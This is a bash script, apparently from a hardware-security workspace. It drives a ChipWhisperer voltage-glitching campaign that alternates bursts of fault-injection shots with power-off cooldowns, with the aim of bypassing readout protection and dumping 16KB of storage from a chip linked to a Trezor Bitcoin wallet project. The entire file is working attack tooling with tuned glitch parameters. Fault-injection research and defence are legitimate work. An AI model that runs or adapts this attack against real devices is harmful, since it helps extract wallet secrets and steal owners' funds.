#!/bin/bash
# Burst + cooldown latch-hunt. Fire a short BURST of shots (kept in the freshest
# part of the flip-rate curve), then a COOLDOWN with the target powered OFF, then
# a FRESH restart. Beats the session drift that per-shot NRST can't: the chip
# cools (target_pwr OFF) and each burst re-opens cw.scope() (FPGA reload), so
# both chip-side and CW-side cumulative state reset every burst.
#
# Knobs:
#   BURST_SHOTS  shots per burst         (default 1000; campaign stops at G_SHOTS)
#   COOL_SEC     target-OFF cooldown     (default 180 = 3 min; try 60-300 to tune
#                                         duty cycle vs. how much cooling it needs)
#   WIN_MIN/MAX  us window               (default 180.4-181.2 = the clean-flip core)
# A 1000-shot burst ~= 23 min; a 3-min cooldown ~= 88% duty.
set -u
cd /home/tdaly/trezor-btc/storage-sim
LOG=/tmp/opencode/fulldump_loop.log
ACCUM=dumps/accum
PY=/home/tdaly/.cwvenv/bin/python
BURST=${BURST_SHOTS:-1000}
COOL=${COOL_SEC:-180}
WMIN=${WIN_MIN:-180.4}
WMAX=${WIN_MAX:-181.2}
mkdir -p "$ACCUM"
cycle=0
merge(){ for d in dumps/run_*; do [ -d "$d" ] || continue
  for f in "$d"/*.bin; do case "$f" in *.bad.bin) continue;; esac
    [ -f "$f" ] && cp -n "$f" "$ACCUM/" 2>/dev/null; done; done; }

cooldown(){   # power the target OFF for COOL sec; fresh CW open resets CW state too
  "$PY" - "$COOL" <<'EOF'
import sys, time, gc
import chipwhisperer as cw
s = cw.scope()
s.io.glitch_hp = False; s.io.glitch_lp = False   # crowbar OFF
s.io.target_pwr = False                          # chip powered DOWN (cool)
time.sleep(int(sys.argv[1]))
s.dis(); del s; gc.collect()
EOF
}

echo "=== BURST+COOLDOWN latch-hunt: burst=${BURST} cool=${COOL}s win=${WMIN}-${WMAX}us  $(date '+%m-%d %H:%M:%S') ===" | tee -a "$LOG"
while true; do
  cycle=$((cycle+1))
  SC=$(ls "$ACCUM"/storage_*.bin 2>/dev/null | wc -l)
  if [ "$SC" -ge 64 ]; then
    "$PY" -I -c "open('$ACCUM/storage_dump.bin','wb').write(b''.join(open('$ACCUM/storage_%04d.bin'%i,'rb').read() for i in range(64)))"
    echo "=== *** FULL 16KB STORAGE DUMP COMPLETE ***" | tee -a "$LOG"; break
  fi
  echo "=== BURST $cycle start (storage $SC/64)  $(date '+%H:%M:%S') ===" | tee -a "$LOG"
  G_CLKGEN=166666667 G_OFFSET=-45 G_WIDTH=5 G_US_MIN=$WMIN G_US_MAX=$WMAX G_US_STEP=0.006 \
  G_RND_REP=1 G_REPEATS=6 G_RND_LO=33 G_RND_HI=45 G_SAMPLES=3 G_COOLDOWN=0.15 \
  G_RESET_EVERY=1 G_FULL=1 G_PASSES=200 G_SHOTS=$BURST G_RESUME="$ACCUM" G_TAG=burst \
  "$PY" -u rdp1_glitch_campaign_full_mem_dump.py 2>&1 | tee -a "$LOG"
  merge
  echo "=== BURST $cycle done -> COOLDOWN target OFF ${COOL}s  $(date '+%H:%M:%S') ===" | tee -a "$LOG"
  cooldown
done
